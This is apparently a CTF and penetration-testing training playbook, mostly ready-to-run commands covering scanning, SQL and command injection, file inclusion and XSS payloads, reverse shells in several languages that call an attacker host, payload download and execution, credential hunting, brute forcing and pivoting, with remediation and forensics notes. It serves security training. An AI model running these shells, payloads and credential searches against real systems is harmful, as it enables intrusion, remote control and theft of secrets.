# H4G Training CTF Playbook

```bash
# ==============================================================================
# AUTOMATED ENVIRONMENT VARIABLES
# Copy-paste this block into your terminal workspace before executing commands.
# ==============================================================================

export TARGET="10.10.11.X"        # Target machine IP
export URL="http://10.10.11.X"     # Target base URL / endpoint
export LHOST="10.10.14.X"         # Attacker IP, usually tun0 / VPN interface
export LPORT="4444"               # Primary reverse shell listener port
export LPORT_ALT="4445"           # Secondary staging / shell listener port
```

## 0. Environment Setup

**Purpose:** Prepare repeatable variables and local output folders before running commands.

```bash
mkdir -p nmap loot scans exploits screenshots notes
echo "$TARGET"
echo "$URL"
ip addr show tun0
```

> **What to watch out for:** Confirm `$TARGET` is the victim machine, `$URL` includes the correct scheme and port, and `$LHOST` is your VPN/tun0 address before starting any callback or reverse shell.

### Challenge Selector

| If the challenge is... | Open this first | Use when |
|---|---|---|
| Boot2root, HackMyVM, TryHackMe machine, OSCP-style box | [Machine Exploitation Databank](blueprints/Machine%20Exploitation%20Databank.md) | You have an IP or VM and need to choose the right attack path. |
| You already know the vulnerable service or attack type | [Machine Attack Blueprint Index](blueprints/machine-attacks/Machine%20Attack%20Blueprint%20Index.md) | You need a template such as SMB, Kerberoasting, LFI, upload, SSTI, MSSQL, NFS, SNMP, or privesc. |
| Web-only challenge or web foothold | [Web Exploit Blueprint](blueprints/Web%20Exploit%20Blueprint.md) | You are working with HTTP requests, routes, auth, sessions, upload, injection, or source review. |
| Binary, crackme, APK, Python bytecode, WebAssembly | [Reverse Engineering Blueprint](blueprints/Reverse%20Engineering%20Blueprint.md) | You need static/dynamic analysis, strings, GDB, decompilers, or solver scripting. |
| Native crash, pwn, ret2win, ret2libc, ROP | [Buffer Overflow Blueprint](blueprints/Buffer%20Overflow%20Blueprint.md) | A binary crashes with long input or the category is pwn/binary exploitation. |
| Hidden data in files, images, audio, metadata | [Steganography Blueprint](blueprints/Steganography%20Blueprint.md) | You have a suspicious artifact and need file/stego triage. |
| Encoding, ciphers, hashes, RSA, custom crypto | [Cryptography Blueprint](blueprints/Cryptography%20Blueprint.md) | You have ciphertext, keys, hashes, or crypto source code. |
| You do not understand the basics yet | [Learning Path Index](learning/Learning%20Path%20Index.md) | You need fundamentals before using a solve template. |

### Quick Study Routes

- Web beginner route: [Web Fundamentals](learning/Web%20Fundamentals.md) -> [Web Application Security Fundamentals](learning/Web%20Application%20Security%20Fundamentals.md) -> [Web Exploit Blueprint](blueprints/Web%20Exploit%20Blueprint.md)
- Machine beginner route: [Networking And Linux Fundamentals](learning/Networking%20And%20Linux%20Fundamentals.md) -> [Machine Exploitation Databank](blueprints/Machine%20Exploitation%20Databank.md) -> [Machine Exploit Blueprint](blueprints/Machine%20Exploit%20Blueprint.md)
- Windows/AD route: [Windows Fundamentals](learning/Windows%20Fundamentals.md) -> [Windows Privilege Escalation Blueprint](blueprints/machine-attacks/Windows%20Privilege%20Escalation%20Blueprint.md) -> [Active Directory Attack Path Cheat Sheet](tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md)
- Reversing route: [Reverse Engineering Fundamentals](learning/Reverse%20Engineering%20Fundamentals.md) -> [Reverse Engineering Blueprint](blueprints/Reverse%20Engineering%20Blueprint.md) -> [REV Python Toolkit](tools/REV%20Python%20Toolkit.md)
- Forensics/crypto route: [Steganography And Cryptography Fundamentals](learning/Steganography%20And%20Cryptography%20Fundamentals.md) -> [Steganography Blueprint](blueprints/Steganography%20Blueprint.md) or [Cryptography Blueprint](blueprints/Cryptography%20Blueprint.md)

## 1. Reconnaissance

### 1.1 Host Discovery

**Purpose:** Confirm the target is alive and identify adjacent hosts when the lab provides a subnet.

```bash
ping -c 1 $TARGET
sudo arp-scan -l
nmap -sn $TARGET
```

> **What to watch out for:** ICMP may be blocked. If ping fails but the target should exist, continue with `-Pn` scans.

### 1.2 Port Scanning

#### Initial Scan

```bash
mkdir -p nmap
nmap -sC -sV -v -oA nmap/initial $TARGET
```

#### Full TCP Scan

```bash
mkdir -p nmap
nmap -p- --min-rate 5000 -v -oA nmap/all-ports $TARGET
```

#### Targeted Scan

```bash
nmap -sC -sV -p <OPEN_PORTS> -v -oA nmap/targeted $TARGET
```

#### UDP Top Ports

```bash
nmap -sU --top-ports 100 -v -oA nmap/udp-top $TARGET
```

> **What to watch out for:** Prioritize unusual ports, outdated service versions, anonymous access, default credentials, exposed admin panels, and scripts showing `vuln`, `weak`, or `misconfigured` output.

### 1.3 Service Enumeration

**Purpose:** Turn ports into attackable services and evidence.

```bash
nmap --script vuln -p <OPEN_PORTS> -oA nmap/vuln $TARGET
whatweb $URL
curl -i $URL
```

> **What to watch out for:** Capture product names, versions, hostnames, redirects, cookies, authentication realms, and technology stacks before using exploits.

For service-specific footprinting commands, open [Footprinting Cheat Sheet](tools/Footprinting%20Cheat%20Sheet.md) first, then use [Service Enumeration Alternatives](tools/Service%20Enumeration%20Alternatives.md) for deeper branches.

### 1.4 Web Enumeration

```bash
curl -i $URL
curl -s $URL/robots.txt
curl -s $URL/sitemap.xml
whatweb $URL
nikto -h $URL
```

> **What to watch out for:** Review headers, cookies, comments, JavaScript files, source maps, admin panels, server banners, and redirect targets.

### 1.5 Directory and File Fuzzing

#### Gobuster

```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,zip,config -o gobuster.txt
```

#### Feroxbuster

```bash
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak,old,zip,config -o feroxbuster.txt
```

#### Dirsearch

```bash
dirsearch -u $URL -e php,txt,bak,old,zip,config -o dirsearch.txt
```

> **What to watch out for:** High-value extensions include `.bak`, `.old`, `.config`, `.zip`, `.tar`, `.gz`, `.sql`, `.db`, `.env`, `.git`, `.php`, `.txt`, and exposed backup directories.

### 1.6 DNS Enumeration

```bash
dig $TARGET
dig -x $TARGET
dig axfr domain.local @$TARGET
dnsrecon -d domain.local -n $TARGET
```

> **What to watch out for:** Zone transfers can reveal hostnames, subdomains, internal services, and AD naming patterns. Add discovered names to `/etc/hosts` when needed.

### 1.7 SMB Enumeration

```bash
smbclient -L //$TARGET/ -N
enum4linux-ng -A $TARGET
crackmapexec smb $TARGET -u '' -p '' --shares
```

> **What to watch out for:** Look for anonymous login, readable shares, writable shares, exposed backups, user lists, scripts, configuration files, and credential reuse opportunities.

### 1.8 FTP Enumeration

```bash
ftp $TARGET
wget -m ftp://anonymous:anonymous@$TARGET/
nmap --script ftp-anon,ftp-syst -p 21 -oA nmap/ftp $TARGET
```

> **What to watch out for:** Check for anonymous login, upload permissions, hidden files, backup archives, and service banners showing outdated versions.

### 1.9 SSH Enumeration

```bash
nmap --script ssh2-enum-algos,ssh-hostkey -p 22 -oA nmap/ssh $TARGET
ssh -i id_rsa user@$TARGET
ssh user@$TARGET
```

> **What to watch out for:** SSH is usually an access path after credential discovery. Prioritize usernames, private keys, weak passwords, and password reuse.

### 1.10 SNMP Enumeration

```bash
snmpwalk -v2c -c public $TARGET
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET
```

> **What to watch out for:** SNMP can leak users, processes, installed software, network interfaces, routes, and service arguments.

## 2. Web Exploitation

### 2.1 SQL Injection

#### Manual Probes

```http
GET /page.php?id=1' HTTP/1.1
Host: target
```

```text
'
' or 1=1-- -
' OR SLEEP(5)-- -
```

#### SQLMap

```bash
sqlmap -u "$URL/page.php?id=1" --batch
sqlmap -u "$URL/page.php?id=1" --batch --dbs
sqlmap -u "$URL/page.php?id=1" --batch -D <DATABASE_NAME> --tables
sqlmap -u "$URL/page.php?id=1" --batch -D <DATABASE_NAME> -T <TABLE_NAME> --dump
```

> **What to watch out for:** Confirm injection points, reflected parameters, database banners, current user privileges, writable directories, and whether stacked queries are supported.

> **Remediation Note:** Use parameterized queries, prepared statements, strict input validation, least-privilege database accounts, and centralized query handling. Never concatenate raw user input into SQL statements.

### 2.2 Command Injection

```text
; id
| id
&& id
$(id)
`id`
```

```bash
curl "$URL/ping?host=127.0.0.1;id"
```

> **What to watch out for:** Common sinks include ping, traceroute, DNS lookup, PDF generation, image conversion, archives, compilers, and admin maintenance tools.

> **Remediation Note:** Avoid shell execution where possible. Use safe language APIs, strict allowlists, argument arrays instead of shell strings, and low-privilege service accounts.

### 2.3 Local File Inclusion

```text
../../../../etc/passwd
/etc/passwd
/var/www/html/index.php
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/access.log
```

```bash
curl "$URL/index.php?page=../../../../etc/passwd"
```

> **What to watch out for:** Use LFI to read source code, configs, usernames, SSH keys, logs, and database credentials before trying noisier paths.

> **Remediation Note:** Use strict file allowlists, avoid dynamic includes from user input, disable remote includes, and isolate sensitive files from the web application context.

### 2.4 Remote File Inclusion

```bash
python3 -m http.server 8000
curl "$URL/index.php?page=http://$LHOST:8000/test.txt"
```

> **What to watch out for:** RFI depends on runtime settings, outbound access, and whether the application includes remote content as executable code or plain text.

### 2.5 Path Traversal

```bash
curl "$URL/download?file=../../../../etc/passwd"
curl "$URL/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

> **What to watch out for:** Try absolute paths, URL encoding, double encoding, Windows paths on IIS, and source/config paths before attempting exploitation.

> **Remediation Note:** Normalize and validate file paths, block traversal sequences, enforce allowlisted directories, and avoid passing user-controlled input directly into filesystem operations.

### 2.6 File Upload Abuse

```bash
curl -i -F "file=@proof.txt" "$URL/upload"
curl -i "$URL/uploads/proof.txt"
```

> **What to watch out for:** Test harmless upload first. Check extension filters, content type checks, storage paths, execution behavior, image processing, and whether uploaded files are renamed.

> **Remediation Note:** Validate file type using server-side checks, rename uploads, store files outside the web root, block executable extensions, and apply content scanning before processing files.

### 2.7 Authentication Bypass

```text
admin' -- -
admin' OR '1'='1'-- -
```

```bash
curl -i -b "role=admin" $URL
```

> **What to watch out for:** Check default credentials, username enumeration, password reset logic, weak cookies, JWT issues, client-side role trust, and IDOR.

> **Remediation Note:** Enforce server-side authorization checks, use secure session handling, apply MFA where appropriate, and test all access-control decisions independently from the frontend.

### 2.8 XSS

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
```

> **What to watch out for:** Identify context first: HTML body, attribute, JavaScript string, markdown, filename, support ticket, or admin review panel.

### 2.9 API Testing

```bash
curl -i "$URL/api/users"
curl -i -X OPTIONS "$URL/api/users"
curl -i -H "Content-Type: application/json" -d '{"test":"value"}' "$URL/api/users"
```

> **What to watch out for:** Check methods, object IDs, authorization, hidden fields, mass assignment, verbose errors, Swagger/OpenAPI docs, and GraphQL endpoints.

## 3. Exploitation and Initial Access

### 3.1 Reverse Shells

#### Bash Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

#### Python Reverse Shell

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect((os.environ["LHOST"],int(os.environ["LPORT"])));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

#### PHP Reverse Shell

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"); ?>
```

#### PowerShell Reverse Shell

```powershell
powershell -NoP -W Hidden -c "$client = New-Object Net.Sockets.TCPClient('$env:LHOST',[int]$env:LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"
```

#### Netcat Reverse Shell

```bash
nc $LHOST $LPORT -e /bin/bash
```

> **What to watch out for:** If the shell connects but immediately dies, check egress filtering, wrong `$LHOST`, blocked `$LPORT`, shell syntax issues, missing binaries, or incompatible shell interpreters.

### 3.2 Bind Shells

```bash
nc -lvnp $LPORT -e /bin/bash
nc $TARGET $LPORT
```

> **What to watch out for:** Bind shells require inbound access to the target. They often fail behind firewalls or NAT.

### 3.3 Payload Staging

```bash
python3 -m http.server 8000
wget http://$LHOST:8000/payload -O /tmp/payload
chmod +x /tmp/payload
```

> **What to watch out for:** Confirm the target can reach `$LHOST:8000`; if not, try another port, protocol, or transfer method.

### 3.4 Netcat Listeners

```bash
nc -lvnp $LPORT
nc -lvnp $LPORT_ALT
```

> **What to watch out for:** Start the listener before triggering the payload. Use `$LPORT_ALT` when a first callback is unstable or blocked.

### 3.5 Metasploit Usage

```bash
msfconsole
```

```text
search <service> <version>
use <module>
set RHOSTS $TARGET
set LHOST $LHOST
set LPORT $LPORT
check
run
```

> **What to watch out for:** Prefer `check` when available. Confirm service versions and target settings before running modules that may crash the target.

### 3.6 Public Exploit Usage

```bash
searchsploit <service> <version>
searchsploit -m <EXPLOIT_ID>
python3 exploit.py --help
```

> **What to watch out for:** Read the exploit before running it. Check hardcoded IPs, ports, payloads, callbacks, dependencies, Python version, and destructive actions.

### 3.7 Manual Exploitation Workflow

1. Confirm the vulnerability with a harmless proof.
2. Identify required preconditions.
3. Prepare listener or staging server.
4. Trigger once and capture output.
5. Stabilize shell.
6. Document evidence and commands.

## 4. Shell Stabilization

### 4.1 Linux TTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
CTRL+Z
```

```bash
stty raw -echo; fg
```

```bash
reset
```

```bash
export TERM=xterm
stty rows 40 columns 120
```

> **What to watch out for:** A stable TTY allows clear screen, command history, tab completion, `su`, text editors, and better interaction with privilege escalation workflows.

### 4.2 Windows Shell Handling

```cmd
whoami
hostname
ipconfig /all
```

```powershell
$PSVersionTable
```

> **What to watch out for:** Identify whether you are in CMD, PowerShell, WinRM, RDP, web shell, or Meterpreter because command syntax and file transfer options differ.

### 4.3 Interactive Shell Fixes

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
```

> **What to watch out for:** If `su`, `sudo`, or editors fail, improve the TTY before continuing privesc.

## 5. Post-Exploitation Enumeration

### 5.1 Linux Enumeration

```bash
id
whoami
hostname
uname -a
sudo -l
ps auxww
ss -tulpn
```

> **What to watch out for:** Prioritize kernel/version, sudo rights, running processes, listening local services, writable paths, credentials, and unusual SUID/capability binaries.

### 5.2 Windows Enumeration

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
net user
net localgroup administrators
systeminfo
cmdkey /list
```

> **What to watch out for:** Check user privileges, service permissions, stored credentials, AlwaysInstallElevated, weak registry permissions, unquoted service paths, and writable service directories.

### 5.3 Users and Groups

```bash
cat /etc/passwd
ls -la /home
groups
```

```cmd
net user
net localgroup
```

> **What to watch out for:** Build a user list for password reuse, SSH, SMB, WinRM, RDP, web panels, and database logins.

### 5.4 Filesystem Discovery

```bash
find / -name "flag*" -o -name "user.txt" -o -name "root.txt" 2>/dev/null
find / -writable -type d 2>/dev/null
```

```powershell
Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue
```

> **What to watch out for:** Check home directories, web roots, backups, config files, hidden files, scripts, and writable directories.

### 5.5 Network Discovery

```bash
ip addr
ip route
ss -tulpn
```

```cmd
route print
netstat -ano
arp -a
```

> **What to watch out for:** Local-only services and internal routes often indicate pivoting opportunities.

### 5.6 Credential Hunting

```bash
grep -RniE 'pass|password|pwd|secret|token|key' /var/www /opt /home 2>/dev/null
find / -name id_rsa -o -name authorized_keys 2>/dev/null
cat ~/.bash_history 2>/dev/null
```

```powershell
Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token"
```

> **What to watch out for:** Prioritize `.env`, config files, database credentials, SSH keys, browser artifacts, command history, backup files, and reused passwords.

## 6. Privilege Escalation

### 6.1 Linux Privilege Escalation

#### LinPEAS With wget

```bash
wget http://$LHOST:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

#### LinPEAS With curl

```bash
curl -O http://$LHOST:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

> **What to watch out for:** In LinPEAS output, red text on a yellow background usually indicates a high-probability privilege escalation vector. Validate manually before executing any exploit.

### 6.2 Windows Privilege Escalation

```powershell
whoami /priv
whoami /groups
Get-CimInstance -ClassName win32_service | Select-Object Name,State,PathName
```

> **What to watch out for:** Focus on `SeImpersonatePrivilege`, service misconfigurations, saved credentials, AlwaysInstallElevated, readable registry secrets, weak permissions, and scheduled tasks.

### 6.3 SUID / SGID Abuse

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

> **What to watch out for:** Compare unusual SUID binaries against GTFOBins, then inspect custom binaries with `file`, `strings`, `ltrace`, `strace`, and GDB.

> **Remediation Note:** Remove unnecessary SUID bits, restrict executable ownership, audit privileged binaries, and apply the Principle of Least Privilege. Avoid custom SUID binaries unless absolutely required and reviewed.

### 6.4 Sudo Misconfiguration

```bash
sudo -l
```

> **What to watch out for:** Check NOPASSWD rules, wildcard arguments, writable scripts, environment preservation, and binaries with shell escapes.

> **Remediation Note:** Restrict sudo rules to specific commands, avoid wildcard arguments, prevent shell escapes, and review `/etc/sudoers` and `/etc/sudoers.d/` entries regularly.

### 6.5 Capabilities Abuse

```bash
getcap -r / 2>/dev/null
```

> **What to watch out for:** `cap_setuid`, `cap_dac_read_search`, and `cap_dac_override` are high-value signals.

### 6.6 Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron 2>/dev/null
```

> **What to watch out for:** Writable scripts, relative paths, wildcard use, and root-executed jobs can become privilege escalation paths.

### 6.7 PATH Hijacking

```bash
echo $PATH
strings ./suid-binary
```

> **What to watch out for:** If a privileged binary calls `tar`, `cp`, `sh`, or another command without an absolute path, controlled PATH entries may matter.

### 6.8 Kernel Exploits

```bash
uname -a
cat /etc/*-release
```

> **What to watch out for:** Kernel exploits are a last resort. Confirm OS, architecture, patch level, compiler availability, and crash risk.

### 6.9 Service Misconfiguration

```cmd
sc qc <SERVICE_NAME>
icacls "C:\Path\To\Service"
```

```bash
systemctl list-units --type=service
find /etc/systemd -writable 2>/dev/null
```

> **What to watch out for:** Writable service binaries, weak service permissions, unquoted service paths, and writable systemd unit files are high-value.

### 6.10 Password Reuse

```bash
su - user
ssh user@$TARGET
smbclient -L //$TARGET/ -U user
```

> **What to watch out for:** Try recovered passwords carefully across OS accounts, SSH, SMB, WinRM, RDP, FTP, CMS admin panels, databases, and internal services.

## 7. Lateral Movement

### 7.1 SSH Pivoting

```bash
ssh -L 8080:127.0.0.1:80 user@$TARGET
ssh -D 1080 user@$TARGET
```

> **What to watch out for:** Local forwards expose one internal service; dynamic SOCKS forwards support broader internal browsing through a proxy.

### 7.2 Port Forwarding

```bash
ssh -L 127.0.0.1:8080:127.0.0.1:80 user@$TARGET
```

> **What to watch out for:** Confirm whether the service is bound to localhost, an internal interface, or all interfaces before forwarding.

### 7.3 Chisel

```bash
chisel server -p 8001 --reverse
chisel client $LHOST:8001 R:1080:socks
```

> **What to watch out for:** Match client/server architecture and direction. Reverse mode is useful when the target can connect out but you cannot connect in.

### 7.4 Ligolo-ng

```bash
ligolo-proxy -selfcert
```

> **What to watch out for:** Ligolo requires interface and route setup. Record internal subnets before adding routes.

### 7.5 Proxychains

```bash
proxychains curl http://127.0.0.1:8080
proxychains nmap -sT -Pn -p 80,445 <INTERNAL_IP>
```

> **What to watch out for:** Use TCP connect scans through proxies. SYN scans usually do not work through SOCKS.

### 7.6 Internal Enumeration

```bash
ip route
arp -a
ss -tulpn
```

> **What to watch out for:** Internal web panels, databases, SMB shares, Redis, Jenkins, Nginx Unit, and AD services often appear only after foothold.

## 8. File Transfer Techniques

### 8.1 Linux File Transfer

```bash
wget http://$LHOST:8000/file -O /tmp/file
curl -O http://$LHOST:8000/file
```

### 8.2 Windows File Transfer

```powershell
Invoke-WebRequest -Uri "http://$env:LHOST:8000/file.exe" -OutFile "C:\Windows\Temp\file.exe"
```

### 8.3 Python HTTP Server

```bash
python3 -m http.server 8000
```

> **What to watch out for:** Start the server from the directory containing the payload or tool you want to transfer.

### 8.4 PowerShell Download

```powershell
iwr "http://$env:LHOST:8000/winpeas.exe" -OutFile "winpeas.exe"
```

### 8.5 SMB Server Transfer

```bash
impacket-smbserver share . -smb2support
```

```cmd
copy \\%LHOST%\share\file.exe C:\Windows\Temp\file.exe
```

> **What to watch out for:** SMB transfer may trigger authentication attempts and can fail if outbound SMB is blocked.

### 8.6 Certutil Transfer

```cmd
certutil -urlcache -f http://%LHOST%:8000/file.exe file.exe
```

> **What to watch out for:** Certutil may be blocked by Defender or policy. Use PowerShell or SMB alternatives if it fails.

## 9. Password Attacks

### 9.1 Hash Identification

```bash
hashid hash.txt
john --list=formats | grep -i nt
```

> **What to watch out for:** Context is often better than auto-detection. Know whether the hash came from Linux shadow, NetNTLM, Kerberos, ZIP, SSH, or a database.

### 9.2 Hashcat

```bash
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt --show
```

### 9.3 John the Ripper

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

### 9.4 Hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
hydra -L users.txt -P passwords.txt ftp://$TARGET
```

> **What to watch out for:** Prefer offline cracking when possible. For online attacks, confirm scope and watch for lockouts, throttling, and false positives.

### 9.5 Wordlists

```bash
cewl $URL -w words.txt
cat users.txt passwords.txt | sort -u > candidates.txt
```

### 9.6 Password Mutation

```bash
hashcat --stdout words.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

> **What to watch out for:** Build target-specific lists from names, hostnames, domains, page text, comments, and discovered files.

## 10. Forensics and Blue Team Notes

### 10.1 PCAP Analysis

```bash
tshark -r capture.pcapng -q -z io,phs
tshark -r capture.pcapng -Y 'http or ftp or telnet or smb or kerberos'
```

> **What to watch out for:** Follow TCP streams, export HTTP/SMB objects, and search for credentials, cookies, tokens, and hostnames.

### 10.2 Log Analysis

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head
grep -Ei 'pass|token|admin|error|select|union' access.log
```

> **What to watch out for:** Look for repeated paths, status-code changes, suspicious user agents, authentication attempts, and payload strings.

### 10.3 Windows Event Logs

```powershell
Get-WinEvent -LogName Security -MaxEvents 20
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624}
```

> **What to watch out for:** Useful IDs include logon, failed logon, process creation, service creation, scheduled task, and PowerShell events.

### 10.4 Sysmon

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20
```

> **What to watch out for:** Sysmon can show process creation, network connections, file creation, registry changes, and image loads.

### 10.5 Memory Forensics

```bash
volatility3 -f memory.raw windows.info
volatility3 -f memory.raw windows.pslist
```

> **What to watch out for:** Start with OS/profile detection, process lists, network connections, command lines, and dumped credentials only in authorized labs.

### 10.6 Timeline Analysis

```bash
find . -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort
```

> **What to watch out for:** Timeline changes help connect exploit time, file writes, persistence, logs, and flag access.

## 11. Reporting and Remediation

### 11.1 Finding Format

Use one finding per vulnerability or attack path.

### 11.2 Evidence Collection

```bash
mkdir -p evidence
cp nmap/*.gnmap nmap/*.nmap evidence/ 2>/dev/null
```

> **What to watch out for:** Save commands, timestamps, screenshots, request/response samples, hashes, user context, and proof output.

### 11.3 Screenshots

Capture proof screens for:

- initial access
- privilege level
- flags/proof files
- sensitive data exposure
- vulnerable request/response
- remediation-relevant configuration

### 11.4 Remediation Notes

Write remediation as engineering actions, not generic advice. Include config files, code patterns, permissions, patch versions, and validation steps when possible.

### 11.5 Final Report Template

```markdown
## Finding Title

**Severity:** Critical / High / Medium / Low / Informational

**Affected Host:** `$TARGET`

**Affected Service / URL:** `$URL`

**Description:**
Explain the vulnerability clearly.

**Impact:**
Explain what an attacker can achieve.

**Evidence:**
Include commands, screenshots, request/response samples, or proof-of-concept output.

**Steps to Reproduce:**
1. Step one.
2. Step two.
3. Step three.

**Remediation:**
Provide specific engineering fixes.

**References:**
- Link to relevant documentation or CVE.
```

## 12. Tool Reference

### 12.1 Linux Tools

- [Footprinting Cheat Sheet](tools/Footprinting%20Cheat%20Sheet.md)
- [Nmap Cheat Sheet](tools/Nmap%20Cheat%20Sheet.md)
- [Networking](tools/Networking.md)
- [Linux Text Processing](tools/Linux%20Text%20Processing.md)
- [Post-Exploitation](tools/Post-Exploitation.md)

### 12.2 Windows Tools

- [Windows Privilege Escalation Cheat Sheet](tools/Windows%20Privilege%20Escalation%20Cheat%20Sheet.md)
- [Mimikatz Cheat Sheet](tools/Mimikatz%20Cheat%20Sheet.md)
- [Pass-the-Hash Cheat Sheet](tools/Pass-the-Hash%20Cheat%20Sheet.md)
- [Active Directory Attack Path Cheat Sheet](tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md)

### 12.3 Web Tools

- [Web Testing](tools/Web%20Testing.md)
- [Web Attack Alternatives](tools/Web%20Attack%20Alternatives.md)
- [Passive Recon](tools/Passive%20Recon.md)
- [Dig Cheat Sheet](tools/Dig%20Cheat%20Sheet.md)

### 12.4 Privilege Escalation Tools

- [Machine Exploitation Databank](blueprints/Machine%20Exploitation%20Databank.md)
- [Machine Attack Blueprint Index](blueprints/machine-attacks/Machine%20Attack%20Blueprint%20Index.md)
- [Linux Attack Path Cheat Sheet](guides/Linux%20Attack%20Path%20Cheat%20Sheet.md)
- [Windows Attack Path Cheat Sheet](guides/Windows%20Attack%20Path%20Cheat%20Sheet.md)

### 12.5 Forensics Tools

- [Steganography Blueprint](blueprints/Steganography%20Blueprint.md)
- [Cryptography Blueprint](blueprints/Cryptography%20Blueprint.md)
- [REV Python Toolkit](tools/REV%20Python%20Toolkit.md)

### 12.6 Wordlists

```bash
ls /usr/share/wordlists
ls /usr/share/seclists
```

> **What to watch out for:** Match wordlists to the task: directory discovery, usernames, passwords, APIs, parameters, DNS, or fuzzing.

### 12.7 External References

- [Blueprint Index](blueprints/Blueprint%20Index.md)
- [Learning Path Index](learning/Learning%20Path%20Index.md)
- [Tools Index](tools/Tools%20Index.md)
- [References Index](references/References%20Index.md)
- [Challenge Use Cases](references/Challenge%20Use%20Cases.md)
